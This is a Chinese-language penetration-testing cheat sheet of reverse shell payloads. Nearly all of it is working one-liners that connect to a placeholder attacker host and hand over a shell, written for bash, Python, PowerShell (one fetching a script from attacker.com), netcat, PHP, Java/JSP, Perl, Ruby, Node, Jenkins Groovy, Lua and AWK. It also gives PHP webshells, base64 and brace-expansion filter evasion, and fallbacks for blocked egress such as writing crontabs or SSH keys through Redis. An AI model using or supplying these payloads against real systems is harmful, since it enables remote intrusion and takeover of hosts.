---
phase: webapp
vuln_class: [rce, reverse-shell]
title: 反弹 Shell 载荷速查
summary: 按"目标上有什么解释器"选一条，先解决出网与编码，再把半交互升成完整 TTY。
---

> 本页是**载荷速查**，不解释 RCE 怎么挖。命令注入怎么打通、disable_functions 怎么绕，见 `web/实战打法/命令执行.md`。

# 反弹 Shell 载荷速查

## 0. 选型判据

| 目标情况 | 选这条 | 备注 |
|---|---|---|
| Linux，有 bash | `/dev/tcp` 一行流 | 最短，无依赖 |
| bash 被禁 / 无 `/dev/tcp` | nc + mkfifo | 需要 `mkfifo` |
| 有 python2/3 | socket + dup2 | 最稳，跨发行版 |
| 只确认有 perl | `perl -e` socket | 老系统常见 |
| 只确认有 ruby | `ruby -rsocket` | 少见但常可用 |
| 有 node（Jenkins/前端服务） | `node -e` net+spawn | Jenkins 场景首选 |
| Jenkins Script Console | Groovy 版 | 直接粘控制台 |
| Windows | PowerShell TCPClient | 或用 powercat |
| PHP 站点（已有 webshell） | `fsockopen` + `proc_open` | 一句话木马升级路径 |
| Java 反序列化 / 表达式注入 | `Runtime.exec` + base64 | 避开特殊字符 |
| Lua / AWK（IoT、嵌入式） | 内置 socket | 固件里唯一可用的 |
| **出网被封** | 改走 bind shell / DNS / ICMP 隧道 | 见 §10 |

---

## 1. Bash

```bash
# 基础一行流
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# exec 方式（不新起进程，适合受限环境）
exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done

# UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

# 已经在命令注入点里，需要显式起 bash
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
```

**坑**：`>&` 顺序敏感。`bash -i >& /dev/tcp/IP/PORT 0>&1` 里 `0>&1` 必须在最后，否则 stdin 没接上，你会收到连接但敲键无反应。

监听端：

```bash
nc -lvnp PORT
```

---

## 2. Python

```bash
# Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3（去掉 p=）
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 已经拿到半交互，升完整 TTY
python -c 'import pty;pty.spawn("/bin/bash")'
```

**升 TTY 标准三步**（拿到 shell 后第一件事）：

```bash
# 1) 受害端起 pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2) Ctrl+Z 挂起，本地执行
stty raw -echo; fg
# 3) 回车两次，然后
export TERM=xterm; stty rows 40 cols 160
```

---

## 3. PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
# Base64 编码执行（绕命令行长度与引号问题）
powershell -e BASE64_ENCODED_COMMAND

# powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/powercat.ps1');powercat -c ATTACKER_IP -p PORT -e cmd"
```

**坑**：`-nop`（NoProfile）必加，否则用户的 profile 脚本会污染输出。Base64 是 **UTF-16LE** 编码，不是 UTF-8：

```bash
echo -n '<命令>' | iconv -t UTF-16LE | base64 -w0
```

---

## 4. Netcat

```bash
# 传统 nc（有 -e 的版本）
nc -e /bin/sh ATTACKER_IP PORT

# OpenBSD nc（无 -e，用 fifo）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# 监听
nc -lvnp PORT

# 传文件
nc -lvnp PORT < file          # 发送端
nc ATTACKER_IP PORT > file    # 接收端
```

**坑**：OpenBSD nc 没有 `-e`，这是最常见的失败原因；`mkfifo` 那行必须整行照抄，少一个重定向就死锁。

---

## 5. PHP

```php
// exec 版（3 号 fd 是 fsockopen 的 socket）
php -r '$sock=fsockopen("attacker_ip",4444);exec("sh <&3 >&3 2>&3");'

// proc_open 版（更稳，支持交互）
php -r '$sock=fsockopen("attacker_ip",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

一句话木马（仅授权测试）：

```php
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_REQUEST["cmd"]); ?>
<?php eval($_POST["cmd"]); ?>
```

完整脚本：`https://github.com/pentestmonkey/php-reverse-shell`（改 `$ip`/`$port` 后上传）。

**判据**：`fsockopen` 被 `disable_functions` 禁时整条失效，改走 `shell_exec` + 系统命令（即 §1/§4），或直接用一句话木马外带。

---

## 6. Java

```java
Runtime rt = Runtime.getRuntime();
String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"};
rt.exec(cmd);
```

**`Runtime.exec` 不走 shell**，管道、重定向、`>` 全都不生效。必须 `{"/bin/bash","-c", ...}` 包一层，或改成 base64 单命令：

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

```jsp
<%@page import="java.util.*,java.io.*"%>
<%
Process p=Runtime.getRuntime().exec("bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}");
%>
```

**`{echo,B64}` 是 bash 的花括号展开**，不是 Java 语法——它把空格变成逗号分隔，绕开空格过滤。生成 payload：

```bash
echo -n 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64 -w0
```

---

## 7. Perl

```perl
# 标准版
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

# IO 模块版（fork 出去，父进程退出）
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## 8. Ruby

```ruby
# 标准版
ruby -rsocket -e'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Windows 兼容版（无 /bin/sh）
ruby -rsocket -e 'c=TCPSocket.new("attacker_ip",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**判据**：`TCPSocket.open(...).to_i` 拿的是 fd 号，`sprintf` 拼 `<&N >&N 2>&N` 三个重定向，一个都不能少。

---

## 9. Node.js / Groovy / Lua / AWK

### Node.js

```javascript
// 标准版
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var client=new net.Socket();client.connect(4444,"attacker_ip",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'

// 简短版（eval 注入点用）
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'")
```

末尾 `return /a/;` 不是装饰——某些 eval 环境要求表达式有返回值，没有会报错。

### Groovy（Jenkins Script Console）

```groovy
String host="attacker_ip";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};
p.destroy();s.close();
```

```groovy
// 简短版
"bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}".execute()
```

### Lua

```lua
# socket 库版（3 号 fd 是 socket）
lua -e "require('socket');require('os');t=socket.tcp();t:connect('attacker_ip','4444');os.execute('sh -i <&3 >&3 2>&3');"

# Lua 5.1 完整交互版
lua5.1 -e 'local host, port = "attacker_ip", 4444 local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port) while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/attacker_ip/4444"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# GNU awk 简化版
gawk 'BEGIN{s="/inet/tcp/0/attacker_ip/4444";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'
```

**判据**：`/inet/tcp/0/` 是 gawk 的内置伪文件，**只有 gawk 有**，mawk/busybox awk 一律不支持。IoT 固件里先 `awk --version` 确认。

---

## 10. 出网被封怎么办

反弹打不通先分清是**没出网**还是**命令没执行**：

```text
□ nc 监听端完全没连接     → 出网被封 / 目标无该解释器 / 命令没执行
□ 有连接但无输出          → fd 重定向顺序错，或 stdin 没接上
□ 连上就断                → 目标侧 sh 立即退出，用 `sh -i` 而非 `sh`
```

出网被封的替代路线：

- **bind shell**：目标监听，你连过去（`nc -lp PORT -e /bin/sh`）
- **DNS / ICMP 隧道**：只允许 DNS 出网时用
- **复用已有通道**：Redis 写 crontab、写 SSH 公钥、写 webshell（见 `web/实战打法/SSRF漏洞.md`）
- **纯回显外带**：命令注入有回显时根本不需要反弹，直接 `;id`

---

## 11. 纪律

1. **先确认解释器存在**再发载荷。`which python3 perl ruby node lua gawk` 一次问清，比盲发十条快。
2. **`>&` 与 `0>&1` 顺序不能改**，这是"连上但敲键无反应"的唯一原因。
3. **拿到 shell 立刻升 TTY**，否则 `su`、`vim`、`top` 全废。
4. **Java `Runtime.exec` 必须包 `bash -c`**，否则管道重定向全失效。
5. **PowerShell Base64 是 UTF-16LE**，用 UTF-8 编出来一定报错。
6. **OpenBSD nc 无 `-e`**，用 mkfifo 那条。
7. **gawk 的 `/inet/` 只有 gawk 有**，busybox 环境别试。
8. **反弹只是为了操作方便，不是目的**。有回显就先用回显，能写文件就先用文件，别为了"弹一个"浪费时间。
9. 所有载荷仅用于授权测试环境。
